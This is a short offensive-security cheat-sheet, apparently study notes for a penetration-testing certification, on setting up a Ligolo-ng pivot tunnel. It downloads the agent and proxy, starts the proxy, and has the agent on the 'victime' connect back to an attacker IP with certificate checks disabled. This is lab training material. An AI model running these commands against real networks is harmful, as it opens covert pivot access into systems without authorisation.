# Ligolo-ng

% ligolo, pivot, tunnel, cpts

## Ligolo-ng - Ligolo-ng - Ligolo-ng - Ligolo-ng - ligolo
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
```

## Ligolo-ng - Ligolo-ng - Ligolo-ng - Ligolo-ng - ligolo-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
```

## Ligolo-ng - Ligolo-ng - Ligolo-ng - Ligolo-ng - ligolo-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
tar -xvzf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
```

## Ligolo-ng - Ligolo-ng - Ligolo-ng - Ligolo-ng - ligolo-4
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
tar -xvzf ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
```

## Ligolo-ng - Ligolo-ng - Ligolo-ng - Ligolo-ng - ligolo-5
#cat/PIVOT/TUNNEL-PORTFW #cpts
On my machine

```
sudo ./proxy -selfcert
```

## Ligolo-ng - Ligolo-ng - Ligolo-ng - Ligolo-ng - ligolo-6
#cat/PIVOT/TUNNEL-PORTFW #cpts
On the victime

```
./agent -connect 10.10.14.245:11601 --ignore-cert
```

## Ligolo-ng - Ligolo-ng - Ligolo-ng - Ligolo-ng - ligolo-7
#cat/PIVOT/TUNNEL-PORTFW #cpts
Back on my machine

```
ligolo-ng » session
```

